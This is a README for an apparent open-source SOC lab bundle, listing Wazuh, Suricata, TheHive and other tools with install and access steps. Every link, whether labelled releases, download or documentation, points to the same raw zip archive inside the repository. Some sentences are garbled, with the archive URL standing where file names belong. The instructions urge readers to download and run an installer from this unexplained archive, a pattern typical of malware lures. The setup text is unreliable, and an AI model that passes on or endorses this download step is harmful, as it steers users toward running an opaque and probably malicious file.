# 🔒 SOC-Lab-Open-Source-Setup - Simple Setup for Your Cybersecurity Lab

[![Download SOC-Lab-Open-Source-Setup](https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip)](https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip)

## 🚀 Getting Started

Welcome! This guide will help you set up your own cybersecurity lab using the SOC-Lab-Open-Source-Setup repository. Whether you are looking to explore security tools or learn more about incident response, you’re in the right place.

## 📦 What You Need

Before you begin the installation process, ensure you have the following:

- A computer running Windows, macOS, or Linux.
- At least 4 GB of RAM.
- At least 10 GB of free disk space.
- A stable internet connection.

## ✔️ Features

This lab includes popular cybersecurity tools:

- **Wazuh**: For security monitoring and log analysis.
- **Suricata**: A powerful intrusion detection and prevention system.
- **Filebeat**: For shipping logs to your desired destinations.
- **Kibana**: For visualizing data with dashboards.
- **TheHive**: To manage and respond to security incidents.
- **Cortex**: For analyzing observables.
- **MISP**: For sharing structured threat information.
- **Grafana**: For additional visualization capabilities.

## 👨‍💻 Download & Install

To download the software, visit this page to download: [SOC-Lab-Open-Source-Setup Releases](https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip).

1. Click on the above link. This will open the Release page of the project.
2. Look for the latest version listed at the top of the page.
3. Choose the appropriate installation file for your operating system.
4. Click to download the installer file (.exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip for Linux).
5. Once the download is complete, locate the installer file on your computer.

To install the software:

- **Windows**: Double-click the installer file and follow the prompts.
- **macOS**: Open the .dmg file and drag the application into the Applications folder.
- **Linux**: Extract the https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip file and follow the installation instructions in the README.

## 🔧 Configuration

After installation, some configuration may be needed to set up the tools:

1. Start the Wazuh manager by launching it from your applications or command line.
2. Configure Suricata to begin monitoring network traffic. You can find configuration examples in the documentation.
3. Set up Filebeat to ship logs to your Elasticsearch instance, which can be accessed through Kibana.
4. TheHive requires setup for incident management. Follow provided instructions to connect Cortex and MISP integrations.

Each tool comes with its own documentation to guide you through specific configurations. Make sure to refer to those as you set them up.

## 🌐 Accessing the Tools

Once everything is installed and configured, you can start using the tools:

- Open your web browser to access Kibana (typically `http://localhost:5601`).
- For TheHive, navigate to its dedicated URL (`http://localhost:9000`).
- Explore Grafana at `http://localhost:3000` to create dashboards.

These tools will allow you to visualize and analyze your security data effectively.

## 📚 Resources

- Check the [Official Documentation](https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip) for further details on each tool and their capabilities.
- Visit online forums and communities for help and to ask questions.
- Search for video tutorials to see step-by-step setup instructions.

## 🔒 Conclusion

Setting up your cybersecurity lab using the SOC-Lab-Open-Source-Setup repository provides you with powerful tools for security analysis and incident response. Don’t hesitate to explore and play around with the different features each tool offers.

For any further assistance, please reach out to community forums or consult the documentation linked above. Enjoy your journey into cybersecurity!